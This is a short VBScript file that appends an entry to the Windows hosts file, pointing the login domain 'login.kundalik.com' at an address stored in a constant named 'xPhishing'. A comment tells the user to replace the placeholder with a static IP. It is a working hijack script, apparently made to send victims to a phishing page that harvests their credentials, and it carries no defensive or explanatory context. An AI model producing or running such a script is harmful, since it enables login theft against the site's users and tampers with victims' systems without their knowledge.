' Change this to Static IP Address
Const xPhishing = "127.0.0.1"
Const xTarget = "login.kundalik.com"

Set oFSO = CreateObject("Scripting.FileSystemObject")
Set oHosts = oFSO.GetFile("C:\Windows\System32\drivers\etc\hosts")

Set file = oFSO.OpenTextFile(oHosts.path, 8, false)
file.Write(vbNewLine & xPhishing & " " & xTarget)
file.Close()

Set file = Nothing
Set oHosts = Nothing
Set oFSO = Nothing
